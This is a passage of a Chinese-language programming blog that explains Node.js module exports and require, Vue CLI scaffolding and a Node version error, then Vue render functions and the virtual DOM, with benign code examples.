class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    模块化开发</span></span><br><span class="line"><span class="comment">    传统非模块化开发有如下的缺点：</span></span><br><span class="line"><span class="comment">    1、命名冲突</span></span><br><span class="line"><span class="comment">    2、文件依赖</span></span><br><span class="line"><span class="comment">    前端标准的模块化规范：</span></span><br><span class="line"><span class="comment">    1、AMD - requirejs</span></span><br><span class="line"><span class="comment">    2、CMD - seajs</span></span><br><span class="line"><span class="comment">    服务器端的模块化规范：</span></span><br><span class="line"><span class="comment">    1、CommonJS - Node.js</span></span><br><span class="line"><span class="comment">    模块化相关的规则：</span></span><br><span class="line"><span class="comment">    1、如何定义模块：一个js文件就是一个模块，模块内部的成员都是相互独立</span></span><br><span class="line"><span class="comment">    2、模块成员的导出和引入</span></span><br><span class="line"><span class="comment">    模块成员的导出最终以module.exports为准</span></span><br><span class="line"><span class="comment">    如果要导出单个的成员或者比较少的成员，一般我们使用exports导出；</span></span><br><span class="line"><span class="comment">    如果要导出的成员比较多，一般我们使用module.exports的方式</span></span><br><span class="line"><span class="comment">    这两种方式不能同时使用</span></span><br><span class="line"><span class="comment">    exports与module的关系：</span></span><br><span class="line"><span class="comment">    module.exports = exports = &#123;&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> sum = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(a) + <span class="built_in">parseInt</span>(b);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 导出模块成员</span></span><br><span class="line"><span class="built_in">exports</span>.sum = sum;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 导出成员的另一种方式</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    模块成员导出：global(不常用)</span></span><br><span class="line"><span class="comment">    已经加载的模块会缓存</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// var flag = 123;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// global.flag = flag;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    引入模块</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> <span class="built_in">module</span> = <span class="built_in">require</span>(<span class="string">&#x27;./03.js&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// var ret = module.sum(12,13);</span></span><br><span class="line"><span class="comment">// console.log(ret);</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// var ret = module(12,15);</span></span><br><span class="line"><span class="comment">// console.log(ret);   </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// console.log(typeof module);</span></span><br><span class="line"><span class="built_in">module</span>();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    模块文件的后缀3种情况：.js .json .node</span></span><br><span class="line"><span class="comment">    上述三种模块的加载优先级(不加文件后缀时的优先级)：.js -&gt; .json -&gt; .node</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// require(&#x27;./07&#x27;);</span></span><br><span class="line"><span class="comment">// console.log(global.flag);</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// var m = require(&#x27;./data.json&#x27;);</span></span><br><span class="line"><span class="comment">// console.log(m.username);</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// var m = require(&#x27;./addon.node&#x27;);</span></span><br><span class="line"><span class="comment">// // console.log(typeof m);</span></span><br><span class="line"><span class="comment">// var ret = m.hello();</span></span><br><span class="line"><span class="comment">// console.log(ret);</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> m = <span class="built_in">require</span>(<span class="string">&#x27;./data&#x27;</span>);</span><br><span class="line"><span class="comment">// console.log(m);</span></span><br><span class="line"><span class="keyword">var</span> ret = m.hello();</span><br><span class="line"><span class="built_in">console</span>.log(ret);</span><br></pre></td></tr></table></figure><p>visual studio code中vetur的快捷键为**&lt;v+tab**</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  </span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="脚手架CLI"><a href="#脚手架CLI" class="headerlink" title="脚手架CLI"></a>脚手架CLI</h3><p>CLI(command line interface)</p><p>脚手架安装过程中使用npm run serve可能会出现如下报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Error: error:0308010C:digital envelope routines::unsupported</span><br><span class="line">    at new Hash (node:internal/crypto/hash:67:19)</span><br><span class="line">    at Object.createHash (node:crypto:130:10)</span><br><span class="line">    at module.exports (/Users/user/Programming Documents/WebServer/untitled/node_modules/webpack/lib/util/createHash.js:135:53)</span><br><span class="line">    at NormalModule._initBuildHash (/Users/user/Programming Documents/WebServer/untitled/node_modules/webpack/lib/NormalModule.js:417:16)</span><br><span class="line">    at handleParseError (/Users/user/Programming Documents/WebServer/untitled/node_modules/webpack/lib/NormalModule.js:471:10)</span><br><span class="line">    at /Users/user/Programming Documents/WebServer/untitled/node_modules/webpack/lib/NormalModule.js:503:5</span><br><span class="line">    at /Users/user/Programming Documents/WebServer/untitled/node_modules/webpack/lib/NormalModule.js:358:12</span><br><span class="line">    at /Users/user/Programming Documents/WebServer/untitled/node_modules/loader-runner/lib/LoaderRunner.js:373:3</span><br><span class="line">    at iterateNormalLoaders (/Users/user/Programming Documents/WebServer/untitled/node_modules/loader-runner/lib/LoaderRunner.js:214:10)</span><br><span class="line">    at iterateNormalLoaders (/Users/user/Programming Documents/WebServer/untitled/node_modules/loader-runner/lib/LoaderRunner.js:221:10)</span><br><span class="line">/Users/user/Programming Documents/WebServer/untitled/node_modules/react-scripts/scripts/start.js:19</span><br><span class="line">  throw err;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>原因：node版本高于17</p><p>解决方法：卸载nodejs，安装nodejs v16.13.0 <em><a href="https://nodejs.org/download/release/v16.13.0/">https://nodejs.org/download/release/v16.13.0/</a></em></p><h4 id="脚手架生成步骤"><a href="#脚手架生成步骤" class="headerlink" title="脚手架生成步骤"></a>脚手架生成步骤</h4><ol><li>```shell<br>vue create 项目名称<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ![image-20220216193402694](https://gitee.com/bluebanister/image/raw/master//img/202202161934072.png)</span><br><span class="line"></span><br><span class="line">   该目录和nodejs中项目的目录一致</span><br><span class="line"></span><br><span class="line">   - node_modules是插件管理文件夹</span><br><span class="line">   - public中有favicon和index.html</span><br><span class="line">   - src中含有入口函数main.js</span><br><span class="line">   - package和package-lock就是插件及版本依赖</span><br><span class="line"></span><br><span class="line">**main.js**</span><br><span class="line"></span><br><span class="line">```js</span><br><span class="line">import Vue from &#x27;vue&#x27;</span><br><span class="line">import App from &#x27;./App.vue&#x27;</span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = false</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">  render: h =&gt; h(App),</span><br><span class="line">&#125;).$mount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure></li></ol><p>$mount(’#app’) ：手动挂载到id为app的dom中的意思，即当vue实例中没有el元素时进行的手动挂载</p><p>脚手架的目录</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151531965.png" alt="image-20220215153057084"></p><p>按照上一节写会出错</p><p>main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  <span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="comment">//render: h =&gt; h(App),</span></span><br><span class="line">  <span class="attr">template</span>:<span class="string">`&lt;App&gt;&lt;/App&gt;`</span>,</span><br><span class="line">  <span class="attr">components</span>:&#123;App&#125;,</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151543951.png" alt="image-20220215154355910"></p><ul><li>使用完整版的vue或者使用render函数</li></ul><p>引入的残缺的vue</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151612675.png" alt="image-20220215161220190"></p><p>缺少模板解析器</p><p>完整版的vue在import Vue from ‘vue/dist/vue.js’</p><ul><li><p>使用render函数</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151632732.webp" alt="img"></p><p>从上图中，不难发现一个Vue的应用程序是如何运行起来的，模板通过编译生成AST，再由AST生成Vue的<code>render</code>函数（渲染函数），渲染函数结合数据生成Virtual DOM树，Diff和Patch后生成新的UI。从这张图中，可以接触到Vue的一些主要概念：</p><ul><li><strong>模板</strong>：Vue的模板基于纯HTML，基于Vue的模板语法，我们可以比较方便地声明数据和UI的关系。</li><li><strong>AST</strong>：AST是<strong>Abstract Syntax Tree</strong>的简称，Vue使用HTML的Parser将HTML模板解析为AST，并且对AST进行一些优化的标记处理，提取最大的静态树，方便Virtual DOM时直接跳过Diff。</li><li><strong>渲染函数</strong>：渲染函数是用来生成Virtual DOM的。Vue推荐使用模板来构建我们的应用界面，在底层实现中Vue会将模板编译成渲染函数，当然我们也可以不写模板，直接写渲染函数，以获得更好的控制 （这部分是我们今天主要要了解和学习的部分）。</li><li><strong>Virtual DOM</strong>：虚拟DOM树，Vue的Virtual DOM Patching算法是基于**<a href="https://links.jianshu.com/go?to=https://github.com/snabbdom/snabbdom">Snabbdom</a>**的实现，并在些基础上作了很多的调整和改进。</li><li><strong>Watcher</strong>：每个Vue组件都有一个对应的<code>watcher</code>，这个<code>watcher</code>将会在组件<code>render</code>的时候收集组件所依赖的数据，并在依赖有更新的时候，触发组件重新渲染。你根本不需要写<code>shouldComponentUpdate</code>，Vue会自动优化并更新要更新的UI。</li></ul><p>上图中，<code>render</code>函数可以作为一道分割线，<code>render</code>函数的左边可以称之为<strong>编译期</strong>，将Vue的模板转换为<strong>渲染函数</strong>。<code>render</code>函数的右边是Vue的运行时，主要是基于渲染函数生成Virtual DOM树，Diff和Patch。</p><h3 id="渲染函数的基础"><a href="#渲染函数的基础" class="headerlink" title="渲染函数的基础"></a>渲染函数的基础</h3><p>Vue推荐在绝大多数情况下使用<code>template</code>来创建你的HTML。然而在一些场景中，需要使用JavaScript的编程能力和创建HTML，这就是**<code>render</code>函数**，它比<code>template</code>更接近编译器。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;hello-world&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#hello-world&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">        Hello world!</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&lt;/h1&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在HTML层，我们决定这样定义组件接口：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;anchored-heading :level=<span class="string">&quot;1&quot;</span>&gt;Hello world!&lt;/anchored-heading&gt;</span><br></pre></td></tr></table></figure><p>当我们开始写一个通过<code>level</code>的<code>prop</code>动态生成<code>heading</code>标签的组件，你可能很快想到这样实现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTML --&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/x-template&quot;</span> <span class="attr">id</span>=<span class="string">&quot;anchored-heading-template&quot;</span>&gt;</span><span class="handlebars"><span class="xml"></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">&quot;level === 1&quot;</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-else-if</span>=<span class="string">&quot;level === 2&quot;</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">v-else-if</span>=<span class="string">&quot;level === 3&quot;</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">h4</span> <span class="attr">v-else-if</span>=<span class="string">&quot;level === 4&quot;</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">h5</span> <span class="attr">v-else-if</span>=<span class="string">&quot;level === 5&quot;</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">h6</span> <span class="attr">v-else-if</span>=<span class="string">&quot;level === 6&quot;</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!-- Javascript --&gt;</span><br><span class="line">Vue.component(<span class="string">&#x27;anchored-heading&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">&#x27;#anchored-heading-template&#x27;</span>,</span><br><span class="line">    <span class="attr">props</span>: &#123;</span><br><span class="line">        <span class="attr">level</span>: &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="built_in">Number</span>,</span><br><span class="line">            <span class="attr">required</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在这种场景中使用 <code>template</code> 并不是最好的选择：首先代码冗长，为了在不同级别的标题中插入锚点元素，我们需要重复地使用 <code>&lt;slot&gt;&lt;/slot&gt;</code>。</p><p>虽然模板在大多数组件中都非常好用，但是在这里它就不是很简洁的了。那么，我们来尝试使用 <code>render</code> 函数重写上面的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(<span class="string">&#x27;anchored-heading&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="keyword">function</span> (<span class="params">createElement</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> createElement(</span><br><span class="line">            <span class="string">&#x27;h&#x27;</span> + <span class="built_in">this</span>.level,   <span class="comment">// tag name 标签名称</span></span><br><span class="line">            <span class="built_in">this</span>.$slots.default <span class="comment">// 子组件中的阵列</span></span><br><span class="line">        )</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">props</span>: &#123;</span><br><span class="line">        <span class="attr">level</span>: &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="built_in">Number</span>,</span><br><span class="line">            <span class="attr">required</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单清晰很多！简单来说，这样代码精简很多，但是需要非常熟悉 Vue 的实例属性。在这个例子中，你需要知道当你不使用 <code>slot</code> 属性向组件中传递内容时，比如 <code>anchored-heading</code> 中的 <code>Hello world!</code>，这些子元素被存储在组件实例中的 <code>$slots.default</code>中。</p><h3 id="节点、树和虚拟DOM"><a href="#节点、树和虚拟DOM" class="headerlink" title="节点、树和虚拟DOM"></a>节点、树和虚拟DOM</h3><p>对Vue的一些概念和渲染函数的基础有一定的了解之后，我们需要对一些浏览器的工作原理有一些了解，这样对我们学习<code>render</code>函数是很重要的。比如下面的这段HTML代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>My title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">    Some text content</span><br><span class="line">    &lt;!-- TODO: Add tagline --&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>当浏览器读到这些代码时，它会建立一个**<a href="https://links.jianshu.com/go?to=https://javascript.info/dom-nodes">DOM节点树</a>**来保持追踪，如果你会画一张家谱树来追踪家庭成员的发展一样。</p><p>HTML的DOM节点树如下图所示：</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151646381.webp" alt="13429147-53f54999b1bc18e9"></p><p>每个元素都是一个节点。每片文字也是一个节点。甚至注释也都是节点。一个节点就是页面的一个部分。就像家谱树一样，每个节点都可以有孩子节点 (也就是说每个部分可以包含其它的一些部分)。</p><p>高效的更新所有这些节点会是比较困难的，不过所幸你不必再手动完成这个工作了。你只需要告诉 Vue 你希望页面上的 HTML 是什么，这可以是在一个模板里：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&#123;&#123; blogTitle &#125;&#125;&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>或者一个渲染函数里：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">render: <span class="function"><span class="keyword">function</span> (<span class="params">createElement</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> createElement(<span class="string">&#x27;h1&#x27;</span>, <span class="built_in">this</span>.blogTitle)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这两种情况下，Vue 都会自动保持页面的更新，即便 <code>blogTitle</code> 发生了改变。</p><h3 id="虚拟DOM"><a href="#虚拟DOM" class="headerlink" title="虚拟DOM"></a>虚拟DOM</h3><p>在Vue 2.0中，渲染层的实现做了根本性改动，那就是引入了虚拟DOM。</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151653699.webp" alt="13429147-4eb2a73597a2a9aa"></p><p>Vue的编译器在编译模板之后，会把这些模板编译成一个渲染函数。而函数被调用的时候就会渲染并且返回一个<strong>虚拟DOM的树</strong>。</p><p>当我们有了这个虚拟的树之后，再交给一个<strong>Patch函数</strong>，负责把这些虚拟DOM真正施加到真实的DOM上。在这个过程中，Vue有自身的响应式系统来侦测在渲染过程中所依赖到的数据来源。在渲染过程中，侦测到数据来源之后就可以精确感知数据源的变动。到时候就可以根据需要重新进行渲染。当重新进行渲染之后，会生成一个新的树，将新的树与旧的树进行对比，就可以最终得出应施加到真实DOM上的改动。最后再通过Patch函数施加改动。</p><p>简单点讲，在Vue的底层实现上，Vue将模板编译成虚拟DOM渲染函数。结合Vue自带的响应系统，在应该状态改变时，Vue能够智能地计算出重新渲染组件的最小代价并应到DOM操作上</p><p>Vue支持我们通过<code>data</code>参数传递一个JavaScript对象做为组件数据，然后Vue将遍历此对象属性，使用<a href="https://links.jianshu.com/go?to=https://www.w3cplus.com/vue/vue-two-way-binding-object-defineproperty.html"><code>Object.defineProperty</code>方法</a>设置描述对象，通过存取器函数可以追踪该属性的变更，Vue创建了一层<code>Watcher</code>层，在组件渲染的过程中把属性记录为依赖，之后当依赖项的<code>setter</code>被调用时，会通知<code>Watcher</code>重新计算，从而使它关联的组件得以更新,如下图：</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151654507.webp" alt="13429147-e5ab233db6c73c31"></p><p>对于Vue自带的响应式系统，并不是咱们今天要聊的东西。我们还是回到Vue的虚拟DOM中来。对于虚拟DOM，咱们来看一个简单的实例，就是下图所示的这个，详细的阐述了<code>模板 → 渲染函数 → 虚拟DOM树 → 真实DOM</code>的一个过程</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202151631761.webp" alt="13429147-3466e87621454e79"></p><p>通过前面的学习，我们初步了解到Vue通过建立一个<strong>虚拟DOM</strong>对真实DOM发生的变化保持追踪。比如下面这行代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> createElement(<span class="string">&#x27;h1&#x27;</span>, <span class="built_in">this</span>.blogTitle)</span><br></pre></td></tr></table></figure><p><code>createElement</code> 到底会返回什么呢？其实不是一个实际的 DOM 元素。它更准确的名字可能是 <code>createNodeDescription</code>，因为它所包含的信息会告诉 Vue 页面上需要渲染什么样的节点，及其子节点。我们把这样的节点描述为“虚拟节点 (Virtual Node)”，也常简写它为“VNode”。“虚拟 DOM”是我们对由 Vue 组件树建立起来的整个 VNode 树的称呼。</p><p>Vue组件树建立起来的整个VNode树是唯一的。这意味着，下面的**<code>render</code>函数是无效**的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">render: <span class="function"><span class="keyword">function</span> (<span class="params">createElement</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> myParagraphVNode = createElement(<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;hi&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> createElement(<span class="string">&#x27;div&#x27;</span>, [</span><br><span class="line">        <span class="comment">// 错误-重复的 VNodes</span></span><br><span class="line">        myParagraphVNode, 